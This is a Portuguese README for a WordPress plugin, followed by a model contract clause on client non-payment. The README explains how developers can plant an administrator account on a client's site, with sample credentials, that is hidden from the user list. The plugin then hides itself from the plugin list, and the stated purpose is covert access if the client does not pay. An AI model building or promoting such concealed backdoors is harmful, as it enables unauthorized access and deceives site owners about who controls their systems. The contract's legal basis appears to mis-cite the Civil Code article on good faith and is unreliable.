# Magic-User-WP  
**O Mago da Privacidade no WordPress!**

Este plugin foi especialmente desenvolvido para desenvolvedores WordPress que precisam acessar o site do cliente por questões de segurança. Em alguns casos, o comprador pode cancelar o pedido ou não realizar o pagamento após o desenvolvimento do site. Com este plugin, você pode acessar o site do cliente de forma discreta, mantendo sua conta de usuário oculta na página de usuários.

---

## Como Usar?

Este plugin foi desenvolvido por motivos de segurança, por isso não criamos nenhuma página de frontend para configurações. Você precisará editar algumas opções antes de usá-lo.

### 1. **Primeiro, edite a função de usuário**

Na linha #26, você encontrará a função `wpshield_addHiddenUserFunction()`. Nessa função, defina os valores das variáveis `$username`, `$useremail` e `$userpass` com suas informações.

```
$username   =   "wpshield";
$useremail  =   "contato@wpshield.com.br";
$userpass   =   "wpshield@75321#";
```

### 2. **Segundo, edite a função da tabela de usuários**

Na linha #48, você encontrará a função `wpshield_preUserQuery()`. Nessa função, defina o valor da variável `$hiddenuser` com o valor da sua variável `$username`, como mostrado abaixo:

```
$hiddenuser = $username;
```

### 3. **Terceiro, esconder o plugin**

Nesta versão, após a ativação, o plugin será automaticamente ocultado da lista de plugins.

**Use com sabedoria.** 🔒


----

# Cláusula Contratual sobre Inadimplemento e Suspensão de Serviço

Este arquivo contém uma cláusula contratual modelo que trata da **falta de pagamento** por parte do cliente e as consequências relacionadas à **suspensão** ou **remoção do site**.

### Cláusula X - Da Falta de Pagamento e Suspensão ou Resolução do Serviço

1. **Pagamento**: O CLIENTE compromete-se a efetuar o pagamento integral do valor acordado pelo serviço de criação do site conforme as condições e prazos estabelecidos na Cláusula X deste contrato. O pagamento deverá ser realizado até a data de vencimento estipulada na fatura ou acordo.

2. **Inadimplemento (não pagamento)**:
   2.1. Em caso de **inadimplemento**, ou seja, não pagamento do valor devido na data acordada, o PRESTADOR de serviços terá o direito de:
   - Suspender o serviço prestado, incluindo o **acesso ao site** criado, até que o pagamento seja regularizado.
   - **Remover o site** do ar, incluindo a exclusão de todos os arquivos, dados, e conteúdos, após **notificação por escrito** ao CLIENTE, concedendo-lhe o prazo de [XX] dias úteis para regularização da pendência financeira, conforme o **artigo 475 do Código Civil Brasileiro**.
   
   2.2. A falta de pagamento por parte do CLIENTE constitui motivo para a **resolução do contrato** por inadimplemento, nos termos do **artigo 475** do Código Civil Brasileiro. O PRESTADOR poderá considerar o contrato **resolvido** após o vencimento do prazo estabelecido para o pagamento, sendo este ato irreversível, com a **extinção da obrigação** e a **perda de direitos sobre o site** por parte do CLIENTE, caso a pendência não seja quitada.

3. **Notificação de Inadimplência**:
   3.1. Caso o CLIENTE não efetue o pagamento na data acordada, o PRESTADOR enviará uma **notificação por escrito** ao CLIENTE, informando sobre a pendência e estabelecendo prazo de [XX] dias úteis para a regularização do pagamento, conforme as disposições do **artigo 421 do Código Civil Brasileiro**, que prevê o princípio da **boa-fé** e da **equidade** nas relações contratuais.
   
   3.2. Se o CLIENTE não regularizar a pendência dentro do prazo estabelecido na notificação, o PRESTADOR poderá **suspender ou remover o site**, conforme estabelecido nesta cláusula, sem prejuízo de buscar a cobrança judicial do valor devido.

4. **Disposições Finais**:
   4.1. A suspensão ou remoção do site conforme esta cláusula não exime o CLIENTE do pagamento integral do valor devido, nem desobriga o CLIENTE de arcar com as obrigações financeiras previstas no contrato.
   4.2. A remoção do site e a resolução do contrato não implicam em devolução de valores já pagos ao CLIENTE, salvo acordo contrário expressamente estipulado.

---

### **Base Legal**:
- **Art. 421 do Código Civil Brasileiro**: Este artigo trata do princípio da boa-fé, que é um princípio norteador da relação contratual e estabelece que as partes devem cumprir suas obrigações de forma justa e equilibrada.
- **Art. 475 do Código Civil Brasileiro**: Este artigo trata do **inadimplemento**, permitindo que a parte prejudicada pela falta de cumprimento do contrato, após o prazo devida notificação, possa resolver o contrato e exigir a extinção das obrigações.

